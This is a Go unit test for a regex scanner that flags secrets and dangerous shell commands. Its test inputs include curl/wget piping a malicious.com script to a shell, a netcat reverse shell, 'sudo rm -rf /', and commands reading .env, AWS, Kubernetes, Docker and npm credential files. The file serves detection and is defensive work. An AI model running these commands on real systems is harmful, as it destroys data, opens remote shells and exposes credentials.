package security

import (
	"testing"
)

func TestRegexScanner_Scan(t *testing.T) {
	scanner := NewRegexScanner()

	tests := []struct {
		name        string
		content     string
		wantFinding string
	}{
		{
			name:        "Safe Content",
			content:     "fmt.Println(\"Hello World\")",
			wantFinding: "",
		},
		{
			name:        "AWS Key",
			content:     "var key = \"AKIAIOSFODNN7EXAMPLE\"",
			wantFinding: "AWS Access Key",
		},
		{
			name:        "GitHub Token",
			content:     "token = \"ghp_123456789012345678901234567890123456\"",
			wantFinding: "GitHub Token",
		},
		{
			name:        "Private Key",
			content:     "-----BEGIN RSA PRIVATE KEY-----\nMIIEpQIBAAKCAQEA...",
			wantFinding: "Private Key",
		},
		{
			name:        "Generic API Key",
			content:     "api_key = \"abc1234567890abc1234567890\"",
			wantFinding: "Generic API Token",
		},
		{
			name:        "Curl Pipe Bash",
			content:     "curl https://malicious.com/install.sh | bash",
			wantFinding: "Pipe to Shell",
		},
		{
			name:        "Wget Pipe Sh",
			content:     "wget -O - https://malicious.com/install.sh | sh",
			wantFinding: "Pipe to Shell",
		},
		{
			name:        "Netcat Reverse Shell",
			content:     "nc -e /bin/sh 10.0.0.1 1234",
			wantFinding: "Reverse Shell",
		},
		// New Tests
		{
			name:        "Sudo Usage",
			content:     "sudo rm -rf /",
			wantFinding: "Sudo Usage",
		},
		{
			name:        "Dump Env (printenv)",
			content:     "printenv",
			wantFinding: "Secret Dump",
		},
		{
			name:        "Dump Env (env on own line)",
			content:     "env",
			wantFinding: "Secret Dump",
		},
		{
			name:        "Safe Env Usage (shebang)",
			content:     "#!/usr/bin/env python",
			wantFinding: "",
		},
		{
			name:        "Safe Env Usage (with args)",
			content:     "env FOO=bar command",
			wantFinding: "", // Should not match bare 'env' regex
		},
		{
			name:        "Cat .env",
			content:     "cat .env",
			wantFinding: "Dangerous Command",
		},
		{
			name:        "Grep .aws",
			content:     "grep -r . .aws",
			wantFinding: "Dangerous Command",
		},
		{
			name:        "Cat Kube Config",
			content:     "cat ~/.kube/config",
			wantFinding: "Dangerous Command",
		},
		{
			name:        "More Docker Config",
			content:     "more ~/.docker/config.json",
			wantFinding: "Dangerous Command",
		},
		{
			name:        "Tail .npmrc",
			content:     "tail -n 10 .npmrc",
			wantFinding: "Dangerous Command",
		},
		{
			name:        "Vim /etc/hosts",
			content:     "vim /etc/hosts",
			wantFinding: "Dangerous Command",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			findings, err := scanner.Scan(tt.content)
			if err != nil {
				t.Fatalf("Scan failed: %v", err)
			}

			if tt.wantFinding == "" {
				if len(findings) > 0 {
					// Check if findings are real or false positives for empty expectation
					// For "Safe Env Usage (with args)", if our regex matches "env ", it might fail.
					t.Errorf("Expected no findings, got %d: %v", len(findings), findings)
				}
			} else {
				if len(findings) == 0 {
					t.Errorf("Expected finding %q, got none", tt.wantFinding)
				} else {
					found := false
					for _, f := range findings {
						if f.Type == tt.wantFinding {
							found = true
							break
						}
					}
					if !found {
						t.Errorf("Expected finding type %q, got %v", tt.wantFinding, findings)
					}
				}
			}
		})
	}
}
